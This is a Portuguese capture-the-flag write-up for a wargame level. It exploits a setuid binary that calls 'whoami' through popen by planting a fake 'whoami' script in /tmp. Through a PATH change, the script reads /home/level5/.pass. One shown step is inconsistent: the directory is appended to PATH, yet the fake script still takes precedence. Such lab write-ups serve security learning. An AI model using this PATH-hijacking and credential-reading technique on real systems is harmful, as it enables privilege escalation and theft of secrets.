# ~ Level 04 ~

```
cd /levels
./level04
Welcome level5
```

Level5?! Que estranho.

```
ls -la
...
-r-sr-x---  1 level5  level4   5159 Dec 18  2013 level04
...
-r--------  1 level4  level4    245 Dec 18  2013 level04.c
...
```

Novamente, temos o source code do level04.

```
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

O software pelo visto executa como level5, mesmo nós estamos num perfil de level4.

O mesmo cria um processo para executar o *whoami*, e então printa.

Comandos como *whoami* são executados pelo diretório informado através da variável PATH do sistema.

```
echo $PATH
/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
which whoami
/usr/bin/whoami
```

Como vemos, o *whoami* está em /usr/bin.

E se criarmos um ambiente, com um *whoami* feito por nós e alterarmos a variável PATH?

```
mkdir /tmp/tmp_ronki
cd /tmp/tmp_ronki
vi whoami
```

Então, escrevi o seguinte script

```
#!/bin/sh

cat /home/level5/.pass
```

Assim, como está executando como level5, temos permissão para pegar o *pass*.

Continuando, precisamos dar permissão total e atualizar o PATH.

```
chmod 777 whoami
export PATH="$PATH:/tmp/tmp_ronki"
echo $PATH
/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/tmp/tmp_ronki
whoami
cat: /home/level5/.pass: Permission denied
```

Parece ok! Vamos testar novamente o level04.

```
/levels/level04
Welcome ###############
```

Conseguimos ;)
